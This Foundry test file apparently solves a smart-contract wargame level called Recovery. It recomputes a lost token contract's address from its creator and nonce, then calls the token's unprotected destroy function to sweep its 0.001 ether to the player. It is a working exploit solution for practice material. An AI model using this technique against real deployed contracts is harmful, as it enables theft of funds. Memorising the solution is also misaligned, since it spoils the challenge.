// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../src/17_Recovery.sol";

contract RecoveryTest is Test {
    address player = makeAddr("player");
    Recovery target;

    function setUp() public {
        vm.deal(player, 1 ether);

        vm.startPrank(player);
        target = new Recovery();
        target.generateToken("SimpleToken", 100_000);
        vm.stopPrank();

        address tokenAddress = _computeFirstCreateAddress(address(target));
        vm.prank(player);
        (bool funded,) = payable(tokenAddress).call{value: 0.001 ether}("");
        assertTrue(funded);
    }

    function testSolve() public {
        address tokenAddress = _computeFirstCreateAddress(address(target));
        uint256 playerBalanceBefore = player.balance;

        assertEq(tokenAddress, vm.computeCreateAddress(address(target), 1));
        assertEq(tokenAddress.balance, 0.001 ether);

        vm.prank(player);
        SimpleToken(payable(tokenAddress)).destroy(payable(player));

        assertEq(tokenAddress.balance, 0);
        assertEq(player.balance, playerBalanceBefore + 0.001 ether);
    }

    function _computeFirstCreateAddress(address creator) private pure returns (address) {
        // RLP([creator, 1]) = 0xd6 || 0x94 || creator || 0x01.
        bytes32 addressHash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x01)));
        return address(uint160(uint256(addressHash)));
    }
}
